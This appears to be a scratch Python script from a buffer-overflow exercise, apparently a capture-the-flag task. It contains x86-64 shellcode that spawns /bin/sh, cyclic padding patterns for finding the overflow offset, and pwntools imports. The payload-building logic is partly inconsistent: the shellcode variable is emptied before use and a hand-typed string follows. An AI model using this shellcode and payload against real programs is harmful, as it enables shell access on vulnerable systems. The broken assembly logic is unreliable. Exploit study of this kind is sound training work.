# 152
before = "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaab"
# 88
afterr = "aaaabaaacaa     eaaafaaagaa     iaaajaaakaa     maaanaaaoaa     qaaaraaasaa     uaaavaaawaa     yaaazaabbaa     daabeaabfaa"

# 23
shellcode = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

# print(shellcode)

shellcode_list = list()

for i in shellcode:
    shellcode_list.append(i)

shellcode = str()

payload = 'a' * (152 - 29) + shellcode + 'a' * (29 - 23)


for i in afterr:
    if i == ' ':
        shellcode += 'a'
    else:
        if len(shellcode_list) != 0:            
            shellcode += shellcode_list[0]
            shellcode_list.pop(0)
        else:
            shellcode += 'a'
        
# print(shellcode)

s = 'H1\xf6VH\xbf/bin//shWT_j;X\x99\x0faaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
# s = 'aaaabaaacaaeaaafaaagaaiaaajaaakaamaaanaaaoaaqaaaraaasaauaaavaaawaayaaazaabbaadaabeaabfaa'
print(len(s))

from pwn import *
import struct

# print(cyclic(1000))